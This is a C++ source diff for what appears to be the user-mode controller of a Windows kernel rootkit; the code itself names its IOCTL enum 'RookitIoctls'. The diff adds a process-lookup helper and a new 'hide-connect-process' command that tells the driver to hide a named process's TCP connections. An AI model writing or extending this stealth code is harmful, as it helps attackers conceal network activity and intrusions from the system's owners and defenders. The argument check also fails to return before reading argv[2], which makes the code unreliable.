@@ -1,4 +1,6 @@
 #include "DriverHandler.h"
+#include <string>
+#include <assert.h>
 
 bool logError(const char* message) 
 {
@@ -10,6 +12,76 @@ bool logInfo(const char* message)
 {
     std::cout << "INFO: " << message << std::endl;
     return true;
+}
+
+bool VerifyProcessIsRunning(_In_ const char* process_name)
+{
+	if (process_name == nullptr || strlen(process_name) == 0)
+	{
+		logError("Empty Process Name.\n");
+		return false;
+	}
+
+	PWCHAR process{ new (std::nothrow) WCHAR[strlen(process_name) + 1] };
+	if (process == nullptr)
+	{
+		logError("Memory allocation Failed\n");
+		return false;
+	}
+	RtlZeroMemory(process, (strlen(process_name) + 1) * sizeof(WCHAR));
+	
+	int convertResult = MultiByteToWideChar(CP_UTF8, 0, process_name, (int)strlen(process_name), &process[0], (int)strlen(process_name));
+	if (convertResult <= 0)
+	{
+		std::cerr << "Failed to convert to the Unicode String. Error:" << GetLastError() << std::endl;
+		delete[] process;
+		return false;
+	}
+
+	// Take a snapshot of all processes in the system.
+	HANDLE hProcessSnap{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
+	if (hProcessSnap == INVALID_HANDLE_VALUE)
+	{
+		logError("Failed: CreateToolhelp32Snapshot (of processes)\n");
+		delete[] process;
+		return(false);
+	}
+
+	// Set the size of the structure before using it.
+	PROCESSENTRY32 pe32{};
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	// Retrieve information about the first process,
+	// and exit if unsuccessful
+	if (!Process32First(hProcessSnap, &pe32))
+	{
+		logError("Failed to get the Process. Error: Process32First\n"); // show cause of failure
+		CloseHandle(hProcessSnap);          // clean the snapshot object
+		delete[] process;
+		return(false);
+	}
+
+	// Now walk the snapshot of processes, and
+	// verfify if we get the given process name.
+	do
+	{
+		printf("PROCESS NAME: %ws\n", pe32.szExeFile);
+
+		// Case insensitive (could use equivalent _stricmp)
+		int result = _wcsicmp(pe32.szExeFile, &process[0]);
+		if (result == 0)
+		{
+			assert(pe32.th32ProcessID);
+			CloseHandle(hProcessSnap);          // clean the snapshot object
+			delete[] process;
+			return(true);
+		}
+		
+	} while (Process32Next(hProcessSnap, &pe32));
+	CloseHandle(hProcessSnap);
+	delete[] process;
+
+	return(false);
 }
 
 Driver::DriverHandler::DriverHandler()
@@ -25,10 +97,12 @@ Driver::DriverHandler::DriverHandler()
 	);
 }
 
-
 Driver::DriverHandler::~DriverHandler()
 {
-	CloseHandle(device_handle_);
+	if (device_handle_ != INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(device_handle_);
+	}	
 }
 
 
@@ -46,7 +120,6 @@ BOOL Driver::DriverHandler::check_connection(char* message)
 		&returned,
 		nullptr
 	);
-
 
 	if (bRet)
 	{
@@ -164,6 +237,32 @@ BOOL Driver::DriverHandler::hide_connect_pid(const char* message)
 		return bRet;
 	}
 	logError("PID  is not a valid Integer type");
+	return FALSE;
+}
+
+BOOL Driver::DriverHandler::hide_connect_process(const char* message)
+{	
+	if (VerifyProcessIsRunning(message))
+	{
+		char* process_name = const_cast<char*>(message);
+		if (process_name == nullptr)
+		{
+			return FALSE;
+		}
+		DWORD BytesReturned{ 0 };
+		BOOL bRet = DeviceIoControl(
+			device_handle_,
+			static_cast<DWORD>(Driver::RookitIoctls::HideConnectProcessName),
+			process_name,
+			(DWORD)strlen(process_name),
+			nullptr,
+			0,
+			&BytesReturned,
+			nullptr
+		);
+		return bRet;
+	}
+	logError("Process Name entry not found in the process list\n");
 	return FALSE;
 }
 
@@ -292,6 +391,25 @@ int Driver::DriverHandler::CmdNetHideConnectPID(int argc, const char** argv)
 	else
 	{
 		logInfo("Connect PID is Hidden!");
+	}
+	return 0;
+}
+
+int Driver::DriverHandler::CmdNetHideConnectProcessName(int argc, const char** argv)
+{
+	if (argc < 3)
+	{
+		logError("Missing Parameters For hide-connect-process (<process name>)\n");
+	}
+
+	const char* connect_process = argv[2];
+	if ((connect_process != nullptr) && (!hide_connect_process(connect_process)))
+	{
+		logError("Couldn't hide TCP connection by Process Name\n");
+	}
+	else
+	{
+		logInfo("TCP connection by Process is Hidden!\n");
 	}
 	return 0;
 }
